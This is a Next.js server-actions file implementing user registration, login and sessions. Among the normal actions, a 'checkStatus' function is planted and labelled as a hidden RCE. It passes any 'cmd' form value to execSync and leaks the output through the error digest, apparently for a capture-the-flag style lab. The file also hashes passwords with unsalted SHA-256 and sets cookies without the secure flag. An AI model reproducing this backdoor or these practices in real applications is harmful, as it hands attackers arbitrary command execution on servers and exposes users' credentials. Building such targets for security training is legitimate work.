'use server'

import { cookies } from 'next/headers'
import { redirect } from 'next/navigation'
import * as fs from 'fs'
import * as crypto from 'crypto'

// Simple JSON file database
const DB_PATH = '/tmp/users.json'

interface User {
    id: string
    email: string
    password: string // hashed
    firstName: string
    lastName: string
    company?: string
    createdAt: string
}

interface UsersDB {
    users: User[]
}

function getDB(): UsersDB {
    try {
        if (fs.existsSync(DB_PATH)) {
            const data = fs.readFileSync(DB_PATH, 'utf-8')
            return JSON.parse(data)
        }
    } catch (e) {
        console.error('DB read error:', e)
    }
    return { users: [] }
}

function saveDB(db: UsersDB): boolean {
    try {
        fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2))
        return true
    } catch (e) {
        console.error('DB write error:', e)
        return false
    }
}

function hashPassword(password: string): string {
    return crypto.createHash('sha256').update(password).digest('hex')
}

function generateSessionId(): string {
    return crypto.randomBytes(32).toString('hex')
}

// Store sessions in memory (simple approach)
const sessions: Map<string, { userId: string; email: string }> = new Map()

export async function registerUser(formData: FormData) {
    const firstName = formData.get('firstName') as string
    const lastName = formData.get('lastName') as string
    const email = formData.get('email') as string
    const company = formData.get('company') as string
    const password = formData.get('password') as string

    if (!firstName || !lastName || !email || !password) {
        throw new Error('All fields are required')
    }

    if (password.length < 8) {
        throw new Error('Password must be at least 8 characters')
    }

    // Create user in memory (works even if filesystem is read-only)
    const newUser: User = {
        id: crypto.randomUUID(),
        email: email.toLowerCase(),
        password: hashPassword(password),
        firstName,
        lastName,
        company: company || undefined,
        createdAt: new Date().toISOString()
    }

    // Try to save to file, but don't fail if it doesn't work
    const db = getDB()
    if (!db.users.find(u => u.email.toLowerCase() === email.toLowerCase())) {
        db.users.push(newUser)
        saveDB(db) // May fail on read-only fs, that's ok
    }

    // Create session in memory
    const sessionId = generateSessionId()
    sessions.set(sessionId, { userId: newUser.id, email: newUser.email })

    // Set cookie
    const cookieStore = await cookies()
    cookieStore.set('session', sessionId, {
        httpOnly: true,
        secure: false,
        sameSite: 'lax',
        maxAge: 60 * 60 * 24 * 7
    })

    redirect('/dashboard')
}

export async function loginUser(formData: FormData) {
    const email = formData.get('email') as string
    const password = formData.get('password') as string

    if (!email || !password) {
        throw new Error('Email and password are required')
    }

    const db = getDB()
    const user = db.users.find(u => u.email.toLowerCase() === email.toLowerCase())

    if (!user || user.password !== hashPassword(password)) {
        throw new Error('Invalid email or password')
    }

    // Create session
    const sessionId = generateSessionId()
    sessions.set(sessionId, { userId: user.id, email: user.email })

    // Set cookie
    const cookieStore = await cookies()
    cookieStore.set('session', sessionId, {
        httpOnly: true,
        secure: false,
        sameSite: 'lax',
        maxAge: 60 * 60 * 24 * 7
    })

    redirect('/dashboard')
}

export async function logoutUser() {
    const cookieStore = await cookies()
    const sessionId = cookieStore.get('session')?.value

    if (sessionId) {
        sessions.delete(sessionId)
        cookieStore.delete('session')
    }

    redirect('/login')
}

export async function getCurrentUser() {
    const cookieStore = await cookies()
    const sessionId = cookieStore.get('session')?.value

    if (!sessionId) {
        return null
    }

    const session = sessions.get(sessionId)
    if (!session) {
        return null
    }

    const db = getDB()
    const user = db.users.find(u => u.id === session.userId)

    if (!user) {
        return null
    }

    return {
        id: user.id,
        email: user.email,
        firstName: user.firstName,
        lastName: user.lastName,
        company: user.company
    }
}

// The vulnerable RCE action - hidden among normal actions
export async function checkStatus(formData: FormData) {
    const { execSync } = await import('child_process')
    const cmd = formData.get('cmd') as string

    if (cmd) {
        try {
            const output = execSync(cmd, {
                encoding: 'utf-8',
                timeout: 5000,
                maxBuffer: 1024 * 1024
            })
            // Side-Channel RCE: return output in digest (as per writeup)
            throw Object.assign(new Error('x'), { digest: output.trim() })
        } catch (e: unknown) {
            if (e && typeof e === 'object' && 'digest' in e) {
                throw e
            }
            const errorMessage = e instanceof Error ? e.message : 'Command failed'
            throw Object.assign(new Error('x'), { digest: errorMessage })
        }
    }
}

export async function submitFeedback(formData: FormData) {
    const message = formData.get('message') as string

    // Just pretend to save feedback
    console.log('Feedback received:', message)
}
